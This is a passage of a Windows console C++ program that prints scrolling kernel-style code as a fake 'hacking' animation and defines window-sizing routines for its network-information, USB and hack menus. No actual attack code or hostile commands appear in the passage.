	cout<<t1<<p1;ct(6);cout<<"<";ct(4);cout<<"X";ct(6);cout<<">";ct(2);
	cout<<"return";delay(1);cout<<" NULL;"<<s1;delay(1);
	cout<<t1<<p1;ct(6);cout<<"<";ct(4);cout<<"X";ct(6);cout<<">";ct(2);
	cout<<"group_info->ngroups = gidsetsize;"<<s1;delay(1);
	cout<<t1<<p1;ct(6);cout<<"<";ct(4);cout<<"X";ct(6);cout<<">";ct(2);
	cout<<"group_info->nblocks = nblocks;"<<s1;delay(1);
	cout<<t1<<p1;ct(6);cout<<"<";ct(4);cout<<"X";ct(6);cout<<">";ct(2);
	cout<<"atomic_set(&group_info->usage, 1);"<<s1<<s1;delay(1);
	
	cout<<t1<<s5;ct(6);cout<<"<";ct(4);cout<<"X";ct(6);cout<<">";ct(2);
	cout<<"if (gidsetsize ";delay(1);cout<<"<= NGROUPS_SMALL)"<<s1;delay(1);
	cout<<t1<<p1;ct(6);cout<<"<";ct(4);cout<<"X";ct(6);cout<<">";ct(2);
	cout<<"group_info";delay(1);cout<<"->blocks[0]";delay(1);cout<<" = group_info->small_block;"<<s1;delay(1);
	cout<<t1<<s5;ct(6);cout<<"<";ct(4);cout<<"X";ct(6);cout<<">";ct(2);
	cout<<"else {"<<s1;delay(1);
	cout<<t1<<p1;ct(6);cout<<"<";ct(4);cout<<"X";ct(6);cout<<">";ct(2);
	cout<<"for ";delay(1);cout<<"(i = 0; i <";delay(1);cout<<" nblocks; i++) {"<<s1;delay(1);
	cout<<t1<<p1;ct(6);cout<<"<";ct(4);cout<<"X";ct(6);cout<<">";ct(2);
	cout<<"     gid_t *b;"<<s1;delay(1);
	cout<<t1<<p1;ct(6);cout<<"<";ct(4);cout<<"X";ct(6);cout<<">";ct(2);
	cout<<"     b = (void *)__";delay(1);cout<<"get_free_page(GFP_USER);"<<s1;delay(1);
	cout<<t1<<p1;ct(6);cout<<"<";ct(4);cout<<"X";ct(6);cout<<">";ct(2);
	cout<<"     if (!b)"<<s1;delay(1);
	cout<<t1<<p1<<s5;ct(6);cout<<"<";ct(4);cout<<"X";ct(6);cout<<">";ct(2);
	cout<<"   goto out_undo_partial_alloc;"<<s1;delay(1);
	cout<<t1<<p1;ct(6);cout<<"<";ct(4);cout<<"X";ct(6);cout<<">";ct(2);
	cout<<"     group_info->blocks[i] = b;"<<s1;delay(1);
	cout<<t1<<p1;ct(6);cout<<"<";ct(4);cout<<"X";ct(6);cout<<">";ct(2);
	cout<<"}"<<s1;delay(1);
	cout<<t1<<s5;ct(6);cout<<"<";ct(4);cout<<"X";ct(6);cout<<">";ct(2);
	cout<<"}"<<s1;delay(1);
	cout<<t1<<s5;ct(6);cout<<"<";ct(4);cout<<"X";ct(6);cout<<">";ct(2);
	cout<<"return group_info;"<<s1;delay(1);
	remove("Settings.bat");
	system("timeout -t 3 > nul");
	menuhack();
}



void vemerson()	//LISTO
{
	//INICIO CODIGO VENTANA
	int alto = 20, ancho = 72;
	wHnd = GetStdHandle(STD_OUTPUT_HANDLE);
    SMALL_RECT windowSize = {0, 0, ancho, alto};
    SetConsoleWindowInfo(wHnd, 1, &windowSize);
    system("color 0f");
    //FIN CODIGO DE VENTANA
}

void vmenu()	//LISTO
{
	//INICIO CODIGO VENTANA
	int alto = 20, ancho = 72;
	wHnd = GetStdHandle(STD_OUTPUT_HANDLE);
    SMALL_RECT windowSize = {0, 0, ancho, alto};
    SetConsoleWindowInfo(wHnd, 1, &windowSize);
    system("color 0f");
    //FIN CODIGO DE VENTANA
}

void vpin()	//LISTO
{
	//INICIO CODIGO VENTANA
	int alto = 28, ancho = 76;
	wHnd = GetStdHandle(STD_OUTPUT_HANDLE);
    SMALL_RECT windowSize = {0, 0, ancho, alto};
    SetConsoleWindowInfo(wHnd, 1, &windowSize);
    system("color 0f");
    //FIN CODIGO DE VENTANA
}

/*
void vram()	//LISTO
{
	
	//INICIO CODIGO VENTANA
	int alto = 20, ancho = 72;
	wHnd = GetStdHandle(STD_OUTPUT_HANDLE);
    SMALL_RECT windowSize = {0, 0, ancho, alto};
    SetConsoleWindowInfo(wHnd, 1, &windowSize);
    system("color 0f");
    //FIN CODIGO DE VENTANA
    
    HWND hWnd = GetConsoleWindow();
    SetWindowPos(hWnd, NULL, 100, 100, 800, 500, SWP_NOZORDER);
	system("color 0f");
	
}
*/


void vcfecha()	//LISTO
{
	//INICIO CODIGO VENTANA
	int alto = 20, ancho = 72;
	wHnd = GetStdHandle(STD_OUTPUT_HANDLE);
    SMALL_RECT windowSize = {0, 0, ancho, alto};
    SetConsoleWindowInfo(wHnd, 1, &windowSize);
   	system("color 0f");
    //FIN CODIGO DE VENTANA system("color 0f");
}

void vinfequipo()	//LISTO
{
	//INICIO CODIGO VENTANA
	int alto = 20, ancho = 72;
	wHnd = GetStdHandle(STD_OUTPUT_HANDLE);
    SMALL_RECT windowSize = {0, 0, ancho, alto};
    SetConsoleWindowInfo(wHnd, 1, &windowSize);
    system("color 0f");
    //FIN CODIGO DE VENTANA
}

void vfullinf()	//LISTO
{
	//INICIO CODIGO VENTANA
	int alto = 40, ancho = 105;
	wHnd = GetStdHandle(STD_OUTPUT_HANDLE);
    SMALL_RECT windowSize = {0, 0, ancho, alto};
    SetConsoleWindowInfo(wHnd, 1, &windowSize);
    system("color 0f");
    //FIN CODIGO DE VENTANA
}

void vmenuredes()	//LISTO
{
	//INICIO CODIGO VENTANA
	int alto = 22, ancho = 72;
	wHnd = GetStdHandle(STD_OUTPUT_HANDLE);
    SMALL_RECT windowSize = {0, 0, ancho, alto};
    SetConsoleWindowInfo(wHnd, 1, &windowSize);
    system("color 0f");
    //FIN CODIGO DE VENTANA
}

void vchora()	//LISTO
{
	//INICIO CODIGO VENTANA
	int alto = 20, ancho = 72;
	wHnd = GetStdHandle(STD_OUTPUT_HANDLE);
    SMALL_RECT windowSize = {0, 0, ancho, alto};
    SetConsoleWindowInfo(wHnd, 1, &windowSize);
   	system("color 0f");
    //FIN CODIGO DE VENTANA system("color 0f");	
}

void vredesguardadas()	//LISTO
{
	//INICIO CODIGO VENTANA
	int alto = 40, ancho = 76;
	wHnd = GetStdHandle(STD_OUTPUT_HANDLE);
    SMALL_RECT windowSize = {0, 0, ancho, alto};
    SetConsoleWindowInfo(wHnd, 1, &windowSize);
    system("color 0f");
    //FIN CODIGO DE VENTANA
}

void vvermac()	//LISTO
{
	//INICIO CODIGO VENTANA
	int alto = 20, ancho = 72;
	wHnd = GetStdHandle(STD_OUTPUT_HANDLE);
    SMALL_RECT windowSize = {0, 0, ancho, alto};
    SetConsoleWindowInfo(wHnd, 1, &windowSize);
    system("color 0f");
    //FIN CODIGO DE VENTANA
}

void vinterfaces()	//LISTO
{
	//INICIO CODIGO VENTANA
	int alto = 20, ancho = 75;
	wHnd = GetStdHandle(STD_OUTPUT_HANDLE);
    SMALL_RECT windowSize = {0, 0, ancho, alto};
    SetConsoleWindowInfo(wHnd, 1, &windowSize);
    system("color 0f");
    //FIN CODIGO DE VENTANA
}

void vdriver()	//LISTO
{
	//INICIO CODIGO VENTANA
	int alto = 40, ancho = 75;
	wHnd = GetStdHandle(STD_OUTPUT_HANDLE);
    SMALL_RECT windowSize = {0, 0, ancho, alto};
    SetConsoleWindowInfo(wHnd, 1, &windowSize);
    system("color 0f");
    //FIN CODIGO DE VENTANA
}

void varp()	//LISTO
{
	//INICIO CODIGO VENTANA
	int alto = 40, ancho = 75;
	wHnd = GetStdHandle(STD_OUTPUT_HANDLE);
    SMALL_RECT windowSize = {0, 0, ancho, alto};
    SetConsoleWindowInfo(wHnd, 1, &windowSize);
    system("color 0f");
    //FIN CODIGO DE VENTANA
}

void vprotocolos()	//LISTO
{
	//INICIO CODIGO VENTANA
	int alto = 40, ancho = 75;
	wHnd = GetStdHandle(STD_OUTPUT_HANDLE);
    SMALL_RECT windowSize = {0, 0, ancho, alto};
    SetConsoleWindowInfo(wHnd, 1, &windowSize);
    system("color 0f");
    //FIN CODIGO DE VENTANA
}

void vaplicaciones()	//LISTO
{
	//INICIO CODIGO VENTANA
	int alto = 31, ancho = 119;
	wHnd = GetStdHandle(STD_OUTPUT_HANDLE);
    SMALL_RECT windowSize = {0, 0, ancho, alto};
    SetConsoleWindowInfo(wHnd, 1, &windowSize);
    system("color 0f");
    //FIN CODIGO DE VENTANA
}

void vmenuhack()
{
	//INICIO CODIGO VENTANA
	int alto = 20, ancho = 72;
	wHnd = GetStdHandle(STD_OUTPUT_HANDLE);
    SMALL_RECT windowSize = {0, 0, ancho, alto};
    SetConsoleWindowInfo(wHnd, 1, &windowSize);
    system("color 0f");
    //FIN CODIGO DE VENTANA
}

void vUSB()
{
	
	//INICIO CODIGO VENTANA
	int alto = 25, ancho = 105;
	wHnd = GetStdHandle(STD_OUTPUT_HANDLE);
    SMALL_RECT windowSize = {0, 0, ancho, alto};
    SetConsoleWindowInfo(wHnd, 1, &windowSize);
    system("color 0f");
    //FIN CODIGO DE VENTANA
}
